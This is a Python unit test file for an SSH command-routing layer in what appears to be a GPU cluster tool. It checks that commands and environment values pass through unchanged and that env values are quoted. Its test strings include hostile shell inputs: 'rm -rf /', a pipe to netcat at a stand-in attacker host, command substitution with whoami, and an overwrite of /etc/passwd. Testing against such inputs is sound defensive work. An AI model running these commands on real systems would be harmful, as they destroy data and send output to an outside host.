import asyncio
from unittest.mock import AsyncMock, patch

from adaptive_core.models import NodeConfig, NodeTarget, RemoteExecutionContext
from adaptive_core.sshutil import ssh_exec_remote
from opensmi.executor import route_command_to_target

NODE = NodeConfig(alias="test-node", address="192.168.1.10", user="testuser", port=22)


def make_context(command, env_vars=None):
    return RemoteExecutionContext(
        target=NodeTarget(
            node_alias="test-node", gpu_indices=[0], node_config=NODE
        ),
        command=command,
        env_vars=env_vars or {},
        execution_mode="direct",
    )


def mock_result(command):
    return AsyncMock(
        exit_code=0,
        stdout="",
        stderr="",
        node_alias="test-node",
        command=command,
        success=True,
    )


def test_command_reaches_ssh_layer_unchanged():
    commands = [
        "python train.py; rm -rf /",
        "python train.py | nc attacker.com 1337",
        "python train.py `whoami`",
        "python train.py $(whoami)",
        "python train.py & rm -rf /",
        "python train.py > /etc/passwd",
        "python train.py \\\n  --epochs 100",
        """python train.py --message 'hello world' --name "test user" """,
    ]
    for command in commands:
        with patch(
            "opensmi.executor.ssh_exec_remote", new_callable=AsyncMock
        ) as mock_ssh:
            mock_ssh.return_value = mock_result(command)
            asyncio.run(route_command_to_target(make_context(command)))
        assert mock_ssh.call_args.kwargs["command"] == command


def test_env_values_reach_ssh_layer_unchanged():
    values = [
        "0,1; rm -rf /",
        "`whoami`",
        "$(whoami)",
        "/path; rm -rf /",
        "key1=value1,key2=value2",
    ]
    for value in values:
        with patch(
            "opensmi.executor.ssh_exec_remote", new_callable=AsyncMock
        ) as mock_ssh:
            mock_ssh.return_value = mock_result("python train.py")
            asyncio.run(
                route_command_to_target(
                    make_context(
                        "python train.py", {"CUDA_VISIBLE_DEVICES": value}
                    )
                )
            )
        assert mock_ssh.call_args.kwargs["env_vars"]["CUDA_VISIBLE_DEVICES"] == value


def test_ssh_exec_remote_quotes_env_values_and_command():
    with patch(
        "opensmi.sshutil.ssh_run_with_retry", new_callable=AsyncMock
    ) as mock_run:
        mock_run.return_value = (0, "", "")
        asyncio.run(
            ssh_exec_remote(
                node=NODE,
                command="python train.py; rm -rf /",
                env_vars={
                    "USER_INPUT": "$(whoami)",
                    "DATA_PATH": "/path; rm -rf /",
                },
            )
        )
    remote_args = mock_run.call_args[0][1]
    assert remote_args[:2] == ["bash", "-c"]
    full_command = remote_args[2]
    assert "python train.py; rm -rf /" in full_command
    assert "USER_INPUT='$(whoami)'" in full_command
    assert "DATA_PATH='/path; rm -rf /'" in full_command
